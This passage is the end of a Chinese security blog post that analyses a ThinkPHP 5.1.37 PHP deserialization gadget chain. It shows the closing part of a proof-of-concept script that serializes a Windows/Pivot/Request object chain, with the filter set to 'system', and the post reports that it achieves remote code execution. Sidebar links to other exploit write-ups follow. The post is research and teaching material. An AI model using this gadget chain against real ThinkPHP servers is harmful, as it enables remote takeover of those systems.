class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];<span class="comment">//对这个键名附上值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;param = [<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本地测试，打出最终payload。</p>
+<img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/33.png" class>
+
+<p>成功执行rce，整条反序列化链到此结束。</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>不知不觉写了两三个小时了，不说了，睡觉去，身体最重要。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xilitter.github.io">XiLitter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xilitter.github.io/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/">https://xilitter.github.io/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xilitter.github.io" target="_blank">XiLitter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Thinkphp/">Thinkphp</a></div><div class="post_share"><div class="social-share" data-image="/img/art/a4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/31/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/" title="python反序列化分析"><img class="cover" src="/img/art01.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">python反序列化分析</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/30/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/" title="博客说明"><img class="cover" src="http://pic.bizhi360.com/bpic/41/11541.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">博客说明</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiLitter</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆去走你的夜路。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiLitter"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiLitter" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/3336741183@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">换博客主题了，感觉还是这个主题更好看，而且功能也多，但是好多功能暂且没设置，以后再弄。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">反序列化链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%BF%E9%9B%B7"><span class="toc-number">3.1.</span> <span class="toc-text">避雷</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">4.</span> <span class="toc-text">结语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Listener内存马"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java内存马连续剧——Listener内存马"/></a><div class="content"><a class="title" href="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Listener内存马">java内存马连续剧——Listener内存马</a><time datetime="2023-08-19T08:46:50.000Z" title="发表于 2023-08-19 16:46:50">2023-08-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Filter内存马"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java内存马连续剧——Filter内存马"/></a><div class="content"><a class="title" href="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Filter内存马">java内存马连续剧——Filter内存马</a><time datetime="2023-08-16T15:14:13.000Z" title="发表于 2023-08-16 23:14:13">2023-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Evilbox打靶记录"><img src="/img/art/a7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Evilbox打靶记录"/></a><div class="content"><a class="title" href="/2023/08/15/Evilbox%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Evilbox打靶记录">Evilbox打靶记录</a><time datetime="2023-08-15T10:18:04.000Z" title="发表于 2023-08-15 18:18:04">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Struts2-S2-001漏洞复现"><img src="/img/art/a4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Struts2-S2-001漏洞复现"/></a><div class="content"><a class="title" href="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Struts2-S2-001漏洞复现">Struts2-S2-001漏洞复现</a><time datetime="2023-08-13T02:16:21.000Z" title="发表于 2023-08-13 10:16:21">2023-08-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/" title="Log4j2 JNDI注入漏洞(CVE-2021-44228)"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Log4j2 JNDI注入漏洞(CVE-2021-44228)"/></a><div class="content"><a class="title" href="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/" title="Log4j2 JNDI注入漏洞(CVE-2021-44228)">Log4j2 JNDI注入漏洞(CVE-2021-44228)</a><time datetime="2023-08-01T07:50:03.000Z" title="发表于 2023-08-01 15:50:03">2023-08-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/art/a4.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By XiLitter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
